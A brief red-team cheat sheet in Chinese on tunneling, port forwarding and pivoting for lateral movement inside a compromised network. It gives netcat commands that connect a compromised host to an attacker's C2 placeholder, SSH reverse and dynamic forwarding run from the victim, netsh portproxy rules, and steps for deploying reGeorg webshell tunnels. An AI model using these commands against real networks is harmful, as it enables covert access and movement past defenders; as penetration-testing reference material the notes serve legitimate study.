---
sidebar_label: '紅隊安全 | 端口轉發與跳板'
---

# 紅隊安全 | 端口轉發與跳板
###### tags: `資訊安全`、`攻擊技術`、`紅隊滲透`

## 用途
- 内網橫向移動
- 跳板


## 常見tunnel分類

| 網路分層  | 協定      | 
| -------- | -------- | 
| 應用層    | ssh, http, https, DNS  | 
|  傳輸層   |     TCP, UDP  |
|  網路層   |  IPv6, ICMP, GRE  |

## 探測出網

### TCP
- compromised：`nc -nv <C2 ip> <port>`
- attacker：`nc -lvp <port>`

### UDP
- compromised：`nc -nv <C2 ip> <port>`
- attacker：`nc -nlvp <port>`

## Proxy chain

- Proxy Chains
    - sudo vim /etc/proxychains4.conf
    - socks5 127.0.0.1 9487
    - USAGE：`proxychains <command>`

## ssh tunneling

- SSH Tunnel
    - Remote Port Forwarding：`ssh -R kali:<port> user@linux host`(受害主機)
    - Dynamic Port Forwarding：`ssh –D 127.0.0.1:9487 user@hostA`(受害主機)
    - socks server

## Chisel
- https://github.com/jpillora/chisel

## netsh portproxy (Windows)
- `netsh interface portproxy add v4tov4 listenaddress=<ip> listenport=<port> connectaddress=<tgt_ip> connectport=<tgt_port>`

## reGeorg (AV會抓)
 - `https://github.com/sensepost/reGeorg`
    - tunnel.ashx 放在目標機上
    - 攻擊機上執行：python2 reGeorgSocksProxy.py -u 'url' -p 'port'
## Neo-reGeorg
- https://github.com/L-codes/Neo-reGeorg
    - python neoreg.py generate –k 密碼
    - python neoreg.py –k 密碼 –u 網址

## Venom
- 多層跳板：https://github.com/Dliv3/Venom